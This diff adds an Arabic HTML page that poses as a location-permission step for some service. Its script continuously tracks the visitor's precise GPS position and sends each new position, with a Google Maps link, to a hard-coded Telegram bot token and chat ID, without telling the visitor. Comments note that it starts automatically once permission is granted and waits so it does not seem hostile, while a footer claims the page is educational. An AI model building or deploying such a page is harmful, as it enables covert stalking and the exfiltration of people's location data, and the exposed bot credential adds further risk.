@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديد الموقع</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            max-width: 400px;
+            width: 100%;
+            padding: 30px 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+        .icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 1.6em;
+        }
+        p.subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 0.95em;
+            line-height: 1.6;
+        }
+        .status-box {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+            min-height: 100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.3s;
+        }
+        .status-box.active {
+            background: #e8f5e9;
+        }
+        .status-text {
+            font-size: 0.95em;
+            color: #555;
+            word-break: break-all;
+        }
+        .coords {
+            font-weight: bold;
+            color: #2e7d32;
+            direction: ltr;
+            display: inline-block;
+            margin-top: 10px;
+            background: #fff;
+            padding: 10px 15px;
+            border-radius: 8px;
+            border: 1px solid #c8e6c9;
+        }
+        .map-link {
+            display: inline-block;
+            margin-top: 15px;
+            background: #667eea;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: 0.3s;
+            box-shadow: 0 4px 10px rgba(102, 126, 234, 0.3);
+        }
+        .map-link:hover {
+            background: #5a6fd1;
+            transform: translateY(-2px);
+        }
+        .permission-btn {
+            background: #ff9800;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 30px;
+            font-size: 1em;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+            margin-top: 15px;
+            box-shadow: 0 4px 10px rgba(255,152,0,0.3);
+        }
+        .permission-btn:hover {
+            background: #f57c00;
+        }
+        .error {
+            color: #d32f2f;
+            font-weight: bold;
+        }
+        .footer-note {
+            margin-top: 20px;
+            font-size: 0.75em;
+            color: #999;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">📍</div>
+        <h2>تحديد موقعك الجغرافي</h2>
+        <p class="subtitle">لمتابعة الخدمة، يرجى السماح بالوصول إلى الموقع.<br>نحن نضمن دقة أفضل التجارب.</p>
+
+        <div class="status-box" id="statusBox">
+            <span id="statusText">⏳ في انتظار الإذن...</span>
+        </div>
+
+        <button class="permission-btn" id="askPermissionBtn" onclick="requestLocationPermission()">🔓 السماح بتحديد الموقع</button>
+
+        <div id="mapLinkContainer" style="margin-top: 15px;"></div>
+
+        <div class="footer-note">
+            هذه الصفحة لأغراض تعليمية فقط
+        </div>
+    </div>
+
+    <script>
+        // ======== ضع التوكنات هنا ========
+        const BOT_TOKEN = '8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM';
+        const CHAT_ID  = '7615377804';
+        // =================================
+
+        let watchId = null;
+        let lastSentLat = null;
+        let lastSentLon = null;
+
+        function sendToTelegram(lat, lon, accuracy) {
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `📍 موقع جديد:\n` +
+                            `الخط: ${lat}\n` +
+                            `الطول: ${lon}\n` +
+                            `الدقة: ±${Math.round(accuracy)} متر\n` +
+                            `الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+                            `📍 [عرض على خرائط غوغل](${googleMapsLink})`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false
+                })
+            }).catch(e => console.error('Telegram error:', e));
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    latitude: lat,
+                    longitude: lon
+                })
+            }).catch(e => console.error('Location send error:', e));
+        }
+
+        function getDistance(lat1, lon1, lat2, lon2) {
+            const R = 6371;
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat/2) ** 2 +
+                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                      Math.sin(dLon/2) ** 2;
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+        }
+
+        function updateUI(lat, lon, accuracy) {
+            const statusBox = document.getElementById('statusBox');
+            const statusText = document.getElementById('statusText');
+            statusBox.classList.add('active');
+            statusText.innerHTML = `
+                ✅ تم تحديد الموقع<br>
+                <span class="coords">
+                    ${lat.toFixed(6)}° N, ${lon.toFixed(6)}° E
+                </span><br>
+                <small>الدقة: ±${Math.round(accuracy)} متر</small>
+            `;
+
+            const mapContainer = document.getElementById('mapLinkContainer');
+            mapContainer.innerHTML = `<a class="map-link" href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">🗺️ فتح في خرائط غوغل</a>`;
+        }
+
+        function startTracking() {
+            if (!navigator.geolocation) {
+                document.getElementById('statusText').innerHTML = '<span class="error">❌ المتصفح لا يدعم تحديد الموقع</span>';
+                return;
+            }
+
+            document.getElementById('statusText').textContent = '🔄 جاري محاولة تحديد الموقع...';
+
+            watchId = navigator.geolocation.watchPosition(
+                (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+
+                    if (lastSentLat && lastSentLon) {
+                        const dist = getDistance(lastSentLat, lastSentLon, latitude, longitude);
+                        if (dist < 0.02) return;
+                    }
+
+                    lastSentLat = latitude;
+                    lastSentLon = longitude;
+
+                    updateUI(latitude, longitude, accuracy);
+                    sendToTelegram(latitude, longitude, accuracy);
+                },
+                (error) => {
+                    let msg = '';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:   msg = '⛔ تم رفض الوصول إلى الموقع'; break;
+                        case error.POSITION_UNAVAILABLE: msg = '📡 الموقع غير متاح حالياً'; break;
+                        case error.TIMEOUT:             msg = '⏰ انتهت مهلة الطلب'; break;
+                        default: msg = '❌ حدث خطأ غير معروف';
+                    }
+                    document.getElementById('statusText').innerHTML = `<span class="error">${msg}</span>`;
+                },
+                {
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 30000
+                }
+            );
+        }
+
+        // دالة للطلب الصريح عبر زر (تساعد في تجاوز حظر النوافذ المنبثقة)
+        function requestLocationPermission() {
+            document.getElementById('askPermissionBtn').style.display = 'none';
+            startTracking();
+        }
+
+        // نبدأ تلقائياً إذا كان المتصفح لا يتطلب إذناً صريحاً (بعض الحالات)
+        window.addEventListener('load', () => {
+            // ننتظر قليلاً حتى لا يبدو عدائياً
+            setTimeout(() => {
+                if (navigator.permissions && navigator.permissions.query) {
+                    navigator.permissions.query({name:'geolocation'}).then(result => {
+                        if (result.state === 'granted') {
+                            startTracking();
+                        } else {
+                            // سيبقى الزر ظاهراً ليضغط المستخدم
+                        }
+                    });
+                } else {
+                    // لا دعم لـ Permissions API، نعرض الزر
+                }
+            }, 500);
+        });
+    </script>
+</body>
+</html>
